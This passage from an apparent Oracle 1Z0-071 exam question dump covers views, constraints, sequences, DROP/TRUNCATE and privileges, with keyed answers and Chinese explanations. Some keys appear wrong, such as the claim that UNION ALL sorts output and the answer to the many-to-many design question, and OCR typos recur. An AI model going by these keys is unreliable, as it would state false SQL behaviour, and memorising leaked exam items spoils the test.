dropping and re-creating it. F. The WITH CHECK OPTION constraint can be used in a view definition to restrict the columns displaved through the view. Correct Answer: CE Explanation/Reference: 考点：视图 关于视图，哪两个陈述是正确的? A. A simple view in which column aliases have been used cannot be updated翻译: 一张列的别名被使用的简单视图不能进行修改解释: 如果是简单视图的话，可以进行update操作，不管列是不是取了别名。 B. A subquery used in a complex view definition cannot contain group functions or joins.翻译: 在一个复杂的视图定义下使用的子查询不能包含聚合函数或者连接解释: 就是因为使用了聚合函数或者连接，所以才成为复杂的视图。所以子查询必须可以包含聚合函数或者连接 C. Rows cannot be deleted through a view if the view definition contains the DISTINCT keyword.(right)翻译: 如果视图定义包含了DISTINCT关键字，那么不能通过这个视图删除行。解释: 在包含DISTINCT关键字的视图上不允许DML操作。 D. Rows added through a view are deleted from the table automatically when the view is dropped. 1z0-071-v.1.0 翻译: 当视图被删除时，通过视图添加的行将自动的从表中被删除。解释: 通过视图添加的行实际上是添加在视图所指向的表上，所以删除视图对视图基于的表没有任何关联操作。 E. The OR REPLACE option is used to change the definition of an existing view without dropping and recreating it.(right)翻译: OR REPLACE选项使用来改变一个已经存在的视图的定义，不用删除视图再重新创建它。 F. The WITH CHECK OPTION constraint can be used in a view definition to restrict the columns displayed through the view.翻译: WITH CHECK OPTION约束可以被使用来在一个视图定义中限制通过视图显示的列。解释: WITH CHECK OPTION约束是限制dml操作结果必须落在视图范围，而确定视图显示的列则是在创建视图时指定的。 QUESTION 18 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the data in the products table. Which statement would add a column called price, which cannot contain NULL A. ALTER TABLE products ADD price NUMBER (8, 2) NOT NULL: B. ALTER TABLE products ADD price NUMBER (8, 2) DEFAULT NOT NULL; C. ALTER TABLE products ADD price NUMBER(8,2) DEFAULT 0 NOT NULL; D. ALTER TABLE products ADD price NUMBER (8,2) DEFAULT CONSTRAINT p_nn NOT NULL; Correct Answer: C Explanation/Reference: 考点：DDL 设置默认值和 not null QUESTION 19 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 A. Both the INSERT statements would fail because all constraints are automatically retrieved when the table is flashed back. B. Both the INsERt statements would succeed because none of the constraints on the table are automatically retrieved when the table is flashed back. C. Only the first INERT statement would succeed because all the constraints except the primary key constraint are autormatically retrieved after al table is flashed back D. Only the second INSERT statement would sucreed because all the constraints except referential integrity constraints that reference other tables are retrieved automatically after the table is flashed back Correct Answer: D Explanation/Reference: 考点：DROP 删除后从回车站收回是，emp表中有empno为1和2的行， 因此第一条插入2的sql会失败； 第二条成功。 QUESTION 20 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two are true about the data dictionary? A. All user actions are recorded in the data dictionary. B. The data dictionary is constantly updated to reflect changes to database objects, permissions, and data. C. The sys user owns all base tables and user-accessible views in the data dictionary. D. Base tables in the data dictionary have the prefix DBA_. E. All users have permissions to access all information in the data dictionary by default Correct Answer: BC Explanation/Reference: 考点：数据字典 关于数据字典，哪两个是正确的? A 错审计可以记录在 OS B 对数据字典不断更新，以反映对数据库对象、权限和数据的更改。 C 对 sys用户拥有数据字典中的所有基表和用户可访问视图。 D 错数据字典中的基表具有前缀 DBA_。数据字典还有其他的前缀，例如 user_ all_ E 错默认情况下，所有用户都有权访问数据字典中的所有信息 QUESTION 21 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 which four statements are true about constraints on ORACLE tables? A. A FOREIGN KEY column can contain NULLS. B. A PRIMARY KEY constraint can be added after a table has been created and populated. C. A NOT NULL constraint can be defined at the table level. D. A column can have only one CHECK constraint. E. A CHECK constraint can refer to values in other rows. F. A UNIQUE constraint can be use a pre-existing index on the constrained column or columns. G. A UNIQUE constraint can permits NULLS. Correct Answer: ABFG Explanation/Reference: 考点：约束 A 对外键可以为空 B 对 alter table add constraint C 错 not null 只能在列级别修改 D 错 only E 错F 对G 对 QUESTION 22 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 which four statements are true regrding primary and foreign key constraints and the effect they can have on table data? A. Primary key and foreign key constraints can be defined at both the column and table level. B. It is possible for child rows that have a foreign key to be deleted automatically from the child table at the time the parent. C. It is possible for child rows that have a foreign key to remain in the child table at the time the parent row is deleted. D. The foreign key columns and parent table primary key columns must have the same names. E. Only the primary key can be defined at both the column and table level. F. A table can have only one primary key but multiple foreign key. G. A table can have only one primary key and one foreign key. Correct Answer: ABCF Explanation/Reference: 考点：主键和外键约束 分析：ABCF A 对列定义和表定义 B 对 on delete cascade C 对 disable 子表的外键之后可以删 D 错名字没要求 E 错唯一也可以 F 对多外键 G 错多外键 QUESTION 23 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You issued this command: DROP TABLE hr.employees; Which three statements are true? A. ALL constraints defined on HR.EMPLOYEES are dropped. B. The HR.EMPLOYEES table may be moved to the recycle bin. C. Synonyms for HR.EMPLOYEES are dropped. D. Sequences used to populate columns in the HR.EMPLOYEES table are dropped. E. All indexes defined on HR.EMPLOYEES are dropped. F. Views referencing HR.EMPLOYEES are dropped. Correct Answer: ABE Explanation/Reference: 考点：DDL DROP分析： A 对 index，约束一同删除 B 对去回收站 C 错同义词失效 D 错序列是公用的，不删 E 对 index，一起去回收站 F 错视图失效 QUESTION 24 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about views in an Oracle database? A. The WITH CHECK clause prevents certain rows from being displayed when querying the view. B. The WITH CHECK clause prevents certain rows from being updated or inserted. C. Tables in the defining query of a view must always exist in order to create the view. D. Date Manipulation Language(DML) can always be used on views. E. Deleting one or more rows using a view whose defining query contains a GROUP BY clause will cause an error. F. Views can be updated without the need to re-grant privileges on the view. G. Inserting one or more rows using a view whose defining query contains a GROUP BY clause will cause an error Correct Answer: BEG Explanation/Reference: 考点：视图 A 错 with check 是插入时候用 B 对 C 错建视图时表可以不须存在 create force view D 错包含 distinct时，不支持dml E 对会报错 F 错需要有 update的权限 G 对会报错 包含distinct语句定义的视图，是否可以执行DML操作？不可以 包含group by语句定义的视图，是否可以执行DML操作？不可以 QUESTION 25 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statement are true about Oracle synonyms? A. A synonym can be available to all users. B. Any user can drop a PUBLIC synonym. C. A synonym created by one user can refer to an object belonging to another user. D. A SEQUERCE can have a synonym. E. A synonym cannot be created for a PL/SQL package. Correct Answer: ACD Explanation/Reference: 考点：同义词 QUESTION 26 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 BOOK_SEQ is an existing sequence in your schema. Which two CREATE TABLE commands are valid? A. CREATE TABLE bookings ( bk_id NUMBER(4) DEFAULT book_seq.NEXTVAL PRIMARY KEY, start_date DATE DEFAULT SYSDATE, end_date DATE DEFAULT SYSDATE NOT NULL); B. CREATE TABLE bookings ( bk_id NUMBER(4), start_date DATE DEFAULT SYSDATE, end_date DATE DEFAULT (end_date &gt;= start_date)); C. CREATE TABLE bookings ( bk_id NUMBER(4) NOT NULL PRIMARY KEY, start_date DATE NOT NULL, end_date DATE DEFAULT SYSDATE); D. CREATE TABLE bookings ( bk_id NUMBER(4) NOT NULL DEFAULT book_seq.CURRVAL, start_date DATE NOT NULL, end_date DATE DEFAULT SYSDATE); E. CREATE TABLE bookings ( bk_id NUMBER(4) DEFAULT book_seq.CURRVAL, start_date DATE DEFAULT SYSDATE, end_date DATE DEFAULT start_date); Correct Answer: AC Explanation/Reference: 考点：序列 A 对B 错 start_date 不能传参，end_date 不能传参 C 对D 错 currval 初始化是空值，跟 not null 冲突。 E 错 start_date 不能传参 QUESTION 27 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true regarding the UNION and UNION ALL operators? A. Duplicates are eliminated automatically by the UNION ALL operator. B. The names of columns selected in each SELECT statement must be identical. C. The output is sorted by the UNION ALL operator. D. The number of columns selected in each SELECT statement must be identical. E. NULLS are not ignored during duplicate checking. Correct Answer: CD Explanation/Reference: 考点：集合 A 错 union all 包括重复 B 错类型相同，列名使用第一个 select C 对按照联合表排序， order by 放昀后。 D 对每个 SELECT语句中选择的列数必须相同 E 错 union 检查重复，null 也计算重复。 QUESTION 28 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You execute this command: ALTER TABLE employees SET UNUSED (department_id); Which two are true? A. A query can display data from the DEPARTMENT_ID column. B. The DEPARTMENT_ID column is set to null for all rows in the table. C. A new column with the name DEPARTMENT_ID can be added to the EMPLOYEES table. D. The DEPARTMENT_ID column can be recovered from the recycle bin. E. The storage space occupied by the DEPARTMENT_ID column is released only after a COMMIT is issued. F. No updates can be made to the data in the DEPARTMENT_ID column. Correct Answer: CF Explanation/Reference: UNUSED 是删字典。Drop 是删数据对系统资源消耗大。 A 错查不到 B 错不改数据 C 对可以重新建立字典 D 错不改数据 E 错不改数据 F 对不改数据 create table test01 (id int,name varchar(20)); alter table test01 drop (id,name); SCOTT@testdb&gt;select * from test01; ID NAME AGE 1 superman 22 设置unused列 SCOTT@testdb&gt;alter table test01 set unused (age); Table altered. SCOTT@testdb&gt;select * from test01; ID NAME 1 superman 无法查看unused列 SCOTT@testdb&gt;select age from test01; select age from test01 * ERROR at line 1: ORA-00904: &quot;AGE&quot;: invalid identifier SCOTT@testdb&gt;alter table test01 add age int; Table altered. SCOTT@testdb&gt;select * from test01; ID NAME AGE 1 superman 删除unused列 SCOTT@ table test01 drop unused columns; Table altered. QUESTION 29 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about built-in data types? A. A VARCHAR2 column definition does not require the length to be specified. B. A BLOB stores unstructured binary data within the database. C. A VARCHAR2 blank-pads column values only if the data stored is non-numeric and contains no special characters. D. A CHAR column definition does not require the length to be specified. E. A BFILE stores unstructured binary data in operating system files. F. The default length for a CHAR column is always on character. Correct Answer: BDE Explanation/Reference: A 错 varchar2 不定义长度会报错 B 对 BLOB(Binary Large Object)，主要用于存储非结构化数据，如图片音频等 C 错 only D 对 char 默认长度 1 E 对二进制文件，存储在数据库外的系统文件，只读的，数据库会将该文件当二进制文件处理 F 错隐式转换 create table test00 (a char,b varchar2(20)); QUESTION 30 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three actions can you perform by using the ALTER TABLE command? A. Drop pseudocolumns from a table. B. Restrict all DML statements on a table. C. Drop all columns simultaneously from a table. D. Lock a set of rows in a table. E. Rename a table. F. Enable or disable constraints on a table. Correct Answer: BEF Explanation/Reference: 考点：alter table 的语法。 https://docs.oracle.com/database/121/SQLRF/statements_3001.htm#SQLRF01001 Drop pseudocolumns from a table. 从表中删除伪列，错 https://docs.oracle.com/database/121/SQLRF/pseudocolumns.htm#SQLRF0025 Restrict all DML statements on a table.限制表中的所有DML语句。无法判断这个说法是否正确？ https://docs.oracle.com/database/121/SQLRF/statements_3001.htm#SQLRF01001 Drop all columns simultaneously from a table. 同时从表中删除所有列。错误，可以批量删除多个列，但是不能将表的所有列同时全部删除。 { SET UNUSED { COLUMN column | (column [, column ]...) } [ { CASCADE CONSTRAINTS | INVALIDATE }... ] [ ONLINE ] | DROP { COLUMN column | (column [, column ]...) } [ { CASCADE CONSTRAINTS | INVALIDATE }... ] [ CHECKPOINT integer ] | DROP { UNUSED COLUMNS | COLUMNS CONTINUE } [ CHECKPOINT integer ] } Lock a set of rows in a table. 锁定表中的一组行。错误，全表加了排他 DDL锁（Exclusive DDL lock）：这会防止其他会话得到它们自己的DDL锁或TM（DML）锁。这说明，在DDL操作期间你可以查询一个表，但是无法以任何方式修改这个表。 Rename a table. 重命名表。正确，语法： RENAME COLUMN old_name TO new_name SCOTT@testdb&gt;alter table test01 rename to test02; Table altered. Enable or disable constraints on a table. 启动或关闭标的约束。正确，语法如下： { ENABLE | DISABLE } [ VALIDATE | NOVALIDATE ] { UNIQUE (column [, column ]...) | PRIMARY KEY | CONSTRAINT constraint_name } [ using_index_clause ] [ exceptions_clause ] [ CASCADE ] [ { KEEP | DROP } INDEX ] QUESTION 31 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true regarding indexes? A. A UNIQUE index can be altered to be non-unique. B. A table belonging to one user can have an index that belongs to a different user. C. An update to a table can result in updates to any or all of the table&apos;s indexes. D. When a table is dropped and is moved to the Recycle BIN, all indexes built on that table are permanently dropped. E. An update to a table can result in no updates to any of the table&apos;s indexes. F. A SELECT statement can access one or more indices without accessing any tables. Correct Answer: BCD Explanation/Reference: 分析：BCD A 错索引只能重建 B 对需要 create any index 权限和分配空间 C 对索引会更新 D 对删表连同索引一起删，不然索引消耗资源。 E 错更新表同时更新索引 F 错索引是扫描用 QUESTION 32 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine these SQL statements which execute successfully: create table emp01 ( emp_no number(2) constraint emp_emp_no_pk primary key, ename varchar2(15), salary number(8,2), mgr_no number(2) ); alter table emp01 add constraint emp_mgr_fk foreign key (mgr_no) references emp(emp_no) on delete set null; alter table emp01 disable constraint emp_emp_no_pk cascade; alter table emp01 enable constraint emp_emp_no_pk; A. The primary key constraint will be enabled and DEFERRED. B. The primary key constraint will be enabled and IMMEDIATE. C. The foreign key constraint will be enabled and DEFERRED. D. The foreign key constraint will be enabled and IMMEDIATE. E. The foreign key constraint will be disabled. Correct Answer: BE Explanation/Reference: https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/CREATE-TABLE.html#GUID-F9CE0CC3-13AE-4744-A43C-EAC7A71AAAB6 create table emp01 ( emp_no number(2) constraint emp_emp_no_pk primary key, ename varchar2(15), salary number(8,2), mgr_no number(2) ); 新建表emp01，其中emp_no上有一个主键 emp_emp_no_pk alter table emp01 add constraint emp_mgr_fk foreign key (mgr_no) references emp01(emp_no) on delete set null; 新建一个外键 emp_mgr_fk，`on delete set null` 代表删除 emp_no时，mgr_no不删除变为null； alter table emp01 disable constraint emp_emp_no_pk cascade; 禁用主键时，主键和外键都被禁用为何此处要有参数 cascade ？ 如果FOREIGN KEYs引用a UNIQUE或PRIMARY KEY，则必须在CASCADE CONSTRAINTS语句中包括该子句DROP，否则无法删除该约束。 alter table emp01 enable constraint emp_emp_no_pk; 启用主键，此时只启用主键，外键还是禁用状态。 select OWNER,CONSTRAINT_NAME, TABLE_NAME,STATUS from user_constraints where table_name=&apos;EMP01&apos;; 检查约束状态 使用on delete set null有一点需要注意的是，被参参照其他表的那一列必须能够被赋空，不能有not null约束，对于上面的例子来说是emp中dept列一定不能有not null约束，如果已经定义了not null约束，又使用了on delete set null来删除被参照的数据时，将会发生：ORA-01407: 无法更新 (”DD”.”EMP”.”DEPT”) 为 NULL的错误。 总的来讲on delete cascade和on delete set null的作用是用来处理级联删除问题的，如果你需要删除的数据被其他数据所参照，那么你应该决定到底希望oracle怎么处理那些参照这些即将要删除数据的数据的，你可以有三种方式：禁止删除。这也是oracle默认的将那些参照本值的数据的对应列赋空，这个需要使用on delete set null关键字将那些参照本值的数据一并删除，这个需要使用on delete cascade关键字 QUESTION 33 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the SALES table: The SALES table has 55,000 rows. Examine this statements: Which two statements are true? A. SALES1 has PRIMARY KEY and UNIQUE constraints on any selected columns which had those constraints in the SALES table. B. SALES1 created with 55,000 rows. C. SALES1 created with no rows. D. SALES1 created with 1 row. E. SALES1 has NOT NULL constraints on any selected columns which had those constraints in the SALES table. Correct Answer: BE Explanation/Reference: 分析：BE B 对 where1=1 不过滤 E 对通过 as select建表带有 not null 约束 QUESTION 34 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three are true about dropping columns from a table? A. A column can be removed only if it contains no data. B. A column drop is implicitly committed. C. A column that is referenced by another column in any other table cannot be dropped. D. A column must be set as unused before it is dropped from a table. E. A primary key column cannot be dropped. F. Multiple columns can be dropped simultaneously using the ALTER TABLE command. Correct Answer: BCF Explanation/Reference: 分析：BCF A 错有数据也可以删列 B 对 drop 是 DDL隐式提交 C 对有子表的列不能删 D 错 unused 是删元数据，drop 是去回收站 E 错有 index 都能删，主键基于索引 F 对删除列用 alter table table1 drop column (col1,col2); QUESTION 35 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You execute this command: TRUNCATE TABLE depts; Which two are true? A. It drops any triggers defined on the table. B. It retains the indexes defined on the table. C. It retains the integrity constraints defined on the table. D. A ROLLBACK statement can be used to retrieve the deleted data. E. It always retains the space used by the removed rows. F. A FLASHBACK TABLE statement can be used to retrieve the deleted data. Correct Answer: BC Explanation/Reference: 分析：BC A错触发器不保存在 table 里面 B 对索引会变，但不删 C 对约束不删 D 错 DDL不能 rollback E 错 always，降水线 F 错降水线，检索水线以下数据库中的完整性约束有： 1.主键约束 (Primary) 2.唯一约束 (unique) 3.检查约束 (check) 4.非空约束 (not null) –属于检查约束 5.外键约束 (foreign key) QUESTION 36 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about sequences in a single instance Oracle database? A. A sequence&apos;s unallocated cached values are lost if the instance shuts down. B. Two or more tables cannot have keys generated from the same sequence. C. A sequence number that was allocated can be rolled back if a transaction fails. D. A sequence can issue duplicate values. E. Sequences can always have gaps. F. A sequence can only be dropped by a DBA. Correct Answer: ADE Explanation/Reference: 解析：虚拟可以一下子产生一组的数字缓存在内存中，但是实例关闭，没有用到的数字也将丢失;序列可以产生重复的值在定义的时候用 cycle 关键字，步长如果不是定义为 1，则产生的数字就不是连续的。 A 对 no cache 是不分配内存。 B 错序列可以公用 C 错序列不会回滚 D 对可以配置 nocycle E 对跳号 F 错授权 QUESTION 37 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Evaluate these commands which execute successfully Which two statements are true about the ORD_ITEMS table and the ORD_SEQ sequence? A. Any user inserting rows into table ORD_ITEMS must have been granted access to sequence ORD_SEQ B. Column ORD_NO gets the next number from sequence ORD_SEQ whenever a row is inserted into ORD_ITEMS and no explicit value is given for ORD_NO C. Sequence ORD_SEQ cycles back to 1 after every 5000 numbers and can cycle 20 time D. If sequence ORD_SEQ is dropped then the default value for column ORD_ON will be null for rows inserted into ORD_ITEMS E. Sequence ORD_SEQ is guaranteed not to generate duplicate numbers Correct Answer: AB Explanation/Reference: ord_items 表中ord_no 列，如果指定该列的值应保证唯一，如果不指定值则使用序列自动生成，前提是用户有访问序列的权限。 create sequence ord_seq increment by 1 start with ` 1z0-071-v.1.0 maxvalue 100000 cycle cache 5000; create table ord_items ( ord_no number(4) default ord_items.nextval not null, item_no number(3), qty number(3), expiry_date date, constaint it_pk primary key (ord_no, item_no)， constaint ord_fk foreign key (ord_no) references on orders (ord_no) ); QUESTION 38 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about defining relations between tables in a relational database? A. Foreign key columns allow null values. B. Unique key columns allow null values. C. Primary key columns allow null values. D. Every primary or unique key value must refer to a matching foreign key value. E. Every foreign key value must refer to a matching primary or unique key value. Correct Answer: ABE Explanation/Reference: 分析：ABE D 错外键参考主键，反过来 QUESTION 39 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this description of the PRODUCTS table: Rows exist in this table with data in all the columns. You put the PRODUCTS table in read-only mode. Which three commands execute successfully on PRODUCTS? A. ALTER TABLE products DROP COLUMN expiry_date; B. CREATE INDEX price_idx ON products (price) C. ALTER TABLE products SET UNUSED (expiry_date) D. TRUNCATE TABLE products; E. ALTER FABLE products DROP UNUSED COLUMNS F. DROP TABLE products Correct Answer: BEF Explanation/Reference: 分析 BEF Products 表只读 A 错只读不能更新数据 B 对可以建约束建索引 C 错只读不能改元数据 D 错只能不能更新 E 对可以 drop 已经 unused F 对可以删表 create table products2 ( prod_id varchar2(6) not null, quantity number(8,2), price number(10,2), expriy_date date ); insert into products2 values (1,100,19.88,sysdate); insert into products2 values (2,200,9.88,sysdate); commit; alter table products2 read only; ALTER TABLE products2 DROP COLUMN expiry_date; # 失败 CREATE INDEX price_idx ON products2 (price); # 成功 ALTER TABLE products2 SET UNUSED (expiry_date); # 失败 TRUNCATE TABLE products2; # 失败 ALTER TABLE products2 DROP UNUSED COLUMNS; # 成功 DROP TABLE products2; # 成功 QUESTION 40 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this business rule: Each student can work on multiple projects and each project can have multiple students You must design an Entity Relationship (ER) model for optimal data storage and allow for generating reports in this FORMAT A. An associative table must be created with a composite key of STUDENT_ID and PROJECT_ID, Which is the foreign key linked to the STUDENTS and PROJECTS entities. B. The ER must have a many-to-many relationship between the STUDENTS and PROJECTS entities that must be resolved into 1 to-many relationships. C. PROJECT_ID must be the primary key in the PROJECTS entity and foreign key in the STUDENTS entity. D. The ER must have a 1-to-many relationship between the STUDENTS and PROJECTS entity E. STUDENT_TD must be the primary key in the STUDENTS entity and foreign key in the PROJECTS entity. Correct Answer: CE Explanation/Reference: 检查这个业务规则: 每个学生可以从事多个项目，每个项目可以有多个学生 您必须设计一个实体关系(ER)模型，以获得昀佳的数据存储和允许生成这种格式的报告. student_id first_name last_name project_id project_name project_task 哪两个说法是正确的？ A) An associative table must be created with a composite key of STUDENT_ID and PROJECT_ID, Which is the foreign key linked to the STUDENTS and PROJECTS entities. B) The ER must have a many-to-many relationship between the STUDENTS and PROJECTS entities that must be resolved into 1 to-many relationships. C) PROJECT_ID must be the primary key in the PROJECTS entity and foreign key in the STUDENTS entity.正确 D) The ER must have a 1-to-many relationship between the STUDENTS and PROJECTS entity E) STUDENT_TD must be the primary key in the STUDENTS entity and foreign key in the PROJECTS 正确 A)必须使用 STUDENT_ID和PROJECT_ID的组合键创建关联表，该组合键是链接到学生和项目实体的外键。 B) ER必须在学生和项目实体之间有多对多的关系，这些关系必须分解为1对多的关系。 C) PROJECT_ID必须是项目实体中的主键和学生中的外键实体。 D) ER必须在学生和项目实体之间建立1对多的关系 E) STUDENT_TD必须是学生实体中的主键，项目中的外键实体。 Exam I DCL管理用户 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three are true about granting object privilege on tables, views, and sequences? A. UPDATE can be granted only on tables and views. B. DELETE can be granted on tables, views, and sequences. C. REFERENCES can be granted only on tables and views. D. INSERT can be granted on tables, views, and sequences. E. SELECT can be granted only on tables and views. F. ALTER can be granted only on tables and sequences. Correct Answer: ACF Explanation/Reference: 考点：权限和角色 table、views、sequences的权限 https://github.com/BoobooWei/booboo_oracle/blob/master/B-SQL%E8%AF%AD%E5%8F%A5-09-DCL%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7.md#%E5%AF%B9%E8%B1%A1%E6%9D%83%E9%99%90 QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The user SCOTT who is the owner of ORDERS and ORDER_ITEMS tables issues this GRANT command: GRANT ALL ON orders, order_items TO PUBLIC; What must be done to fix the statement? A. ALL should be replaced with a list of specific privileges. B. WITH GRANT OPTION should be added to the statement. C. PUBLIC should be replaced with specific usernames. D. Separate GRANT statements are required for the ORDERS and ORDER_ITEMS tables. Correct Answer: D Explanation/Reference: 考点：权限和角色 grant all on sales,products to public *第 1 行出现错误: ORA-00905: 缺失关键字 ) QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three are true about privileges and roles? A. A role can contain a combination of several privileges and roles. B. PUBLIC acts as a default role granted to every user in a database. C. System privileges always set privileges for an entire database. D. A user has all object privileges for every object in their schema by default. E. PUBLIC can be revoked from a user. F. A role is owned by the user who created it. G. All roles are owned by the sys schema. Correct Answer: ADG Explanation/Reference: 考点：权限和角色 A 对角色可以包含角色和权限 B 错 public不是角色，你可以理解为所有数据库用户的集合。如果某个权限赋于了public，那么所有数据库的用户都可以有这个权限（当然有些用户可能连connect的权限都可以没有）。 C 错 D 对 E 错 F 错 role 是权限的集合 select * from dba_role_privs; G 对 QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam 